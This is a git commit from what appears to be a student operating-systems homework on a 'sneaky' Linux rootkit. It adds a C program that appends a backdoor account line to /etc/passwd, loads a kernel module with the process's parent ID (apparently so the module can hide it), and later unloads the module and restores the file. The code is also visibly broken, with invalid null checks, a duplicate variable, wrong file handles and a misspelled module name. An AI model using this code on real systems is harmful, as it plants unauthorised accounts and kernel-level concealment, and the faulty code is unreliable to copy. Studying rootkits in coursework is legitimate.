e5f070712ea8b26c9438d0613e36ddadea3672c8
cw373 <cw373@duke.edu>
2019-04-14 21:18:18 -0400

    add process

--- homework5-kit/test/4.10/sneaky_mod.mod.c
+++ homework5-kit/test/4.10/sneaky_mod.mod.c
@@ -3,7 +3,6 @@
 #include <linux/compiler.h>
 
 MODULE_INFO(vermagic, VERMAGIC_STRING);
-MODULE_INFO(name, KBUILD_MODNAME);
 
 __visible struct module __this_module
 __attribute__((section(".gnu.linkonce.this_module"))) = {
@@ -19,10 +18,22 @@ __attribute__((section(".gnu.linkonce.this_module"))) = {
 MODULE_INFO(retpoline, "Y");
 #endif
 
+static const struct modversion_info ____versions[]
+__used
+__attribute__((section("__versions"))) = {
+	{ 0x7377b0b2, __VMLINUX_SYMBOL_STR(module_layout) },
+	{ 0x24462570, __VMLINUX_SYMBOL_STR(param_ops_short) },
+	{ 0xd8fa87d1, __VMLINUX_SYMBOL_STR(param_ops_long) },
+	{ 0xa32395dc, __VMLINUX_SYMBOL_STR(param_ops_charp) },
+	{ 0x964fcf43, __VMLINUX_SYMBOL_STR(param_ops_int) },
+	{ 0xded0e68d, __VMLINUX_SYMBOL_STR(param_array_ops) },
+	{ 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) },
+};
+
 static const char __module_depends[]
 __used
 __attribute__((section(".modinfo"))) =
 "depends=";
 
 
-MODULE_INFO(srcversion, "A704327C32F7F311666C13C");
+MODULE_INFO(srcversion, "F431E9A4154F4D2706A7522");
---
+++ homework5-kit/test/4.10/sneaky_process.c
@@ -0,0 +1,126 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <string.h>
+#include <sys/wait.h>
+//const char *originfile="etc/password";
+//const char *tmpfile="tmp/password";
+  
+
+int main(){
+  //#1 print id
+  printf("sneaky_process pid:%d\n",getpid());
+  //#2.1 copy file to destination
+  FILE *f_o =fopen("/etc/passwd","r");
+  if(*f_o==NULL) {
+    perror("cannot open /etc/passwd");
+    return -1;
+  }
+  char c;
+  FILE *f_w=fopen("test/tmp","w");
+  while((c=fgetc(f_o))!=EOF){
+    fprintf(f_w,"%c",c);
+  }
+  if( fclose(f_o)!=0|| fclose(f_w)!=0){
+    perror("cannot close file during coping");
+    return -1;
+  }
+  //#2.2 add line to the original
+  FILE *add_line=fopen("/etc/passwd","a");
+  const char* s="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+  fprintf(add_line,"%s",s);
+  if(fclose(add_line)!=0){
+    perror("cannot close add line");
+    return -1;
+  }
+  //#3. load module
+  int fork_val=0;
+  if((fork_val=fork())==-1){
+    perror("fork wrong");
+    return -1;
+  }
+  else if(fork_val==0){//using 
+    char cur_p[50];
+    memset(cur_p,0,50);
+    sprintf(cur_p,"sneaky_id=%d",getppid());
+    if(execlp("insmod","insmod","senaky_mod.ko",cur_p,NULL)==-1){
+      perror("load module error");
+      return -1;
+    }
+  }
+  else{
+    int status=0; 
+    if(waitpid(fork_val,&status,WUNTRACED|WCONTINUED)==-1){
+      perror("waitpid");
+      return -1;
+    }
+    if (WIFEXITED(status)) {
+      printf("exited, status=%d\n", WEXITSTATUS(status));
+    } else if (WIFSIGNALED(status)) {
+      printf("killed by signal %d\n", WTERMSIG(status));
+    } else if (WIFSTOPPED(status)) {
+      printf("stopped by signal %d\n", WSTOPSIG(status));
+    } else if (WIFCONTINUED(status)) {
+      printf("continued\n");
+    }
+  }
+  //3.wait for q
+  while(1){
+    if(getchar()=='q')
+      break;
+  }
+  //4.unload 
+  fork_val=0;
+  if((fork_val=fork())==-1){
+    perror("fork wrong");
+    return -1;
+  }
+  else if(fork_val==0){//using 
+    if(execlp("rmmod","rmmod","senaky_mod.ko",NULL)==-1){
+      perror("load module error");
+      return -1;
+    }
+  }
+  else{
+    int status=0; 
+    if(waitpid(fork_val,&status,WUNTRACED|WCONTINUED)==-1){
+      perror("waitpid");
+      return -1;
+    }
+    if (WIFEXITED(status)) {
+      printf("exited, status=%d\n", WEXITSTATUS(status));
+    } else if (WIFSIGNALED(status)) {
+      printf("killed by signal %d\n", WTERMSIG(status));
+    } else if (WIFSTOPPED(status)) {
+      printf("stopped by signal %d\n", WSTOPSIG(status));
+    } else if (WIFCONTINUED(status)) {
+      printf("continued\n");
+    }
+  }
+  //#5.restore
+  FILE *f_w_restore =fopen("/etc/passwd","w");
+  if(*f_w_restore==NULL) {
+    perror("cannot open /etc/passwd");
+    return -1;
+  }
+  char c;
+  FILE *f_r_restore=fopen("test/tmp","r");
+  while((c=fgetc(f_w_restore))!=EOF){
+    fprintf(f_w_restore,"%c",c);
+  }
+  if( fclose(f_o_restore)!=0|| fclose(f_w_restore)!=0){
+    perror("cannot close file during coping");
+    return -1;
+  }
+  
+  
+  return EXIT_SUCCESS;
+
+
+  
+ 
+}
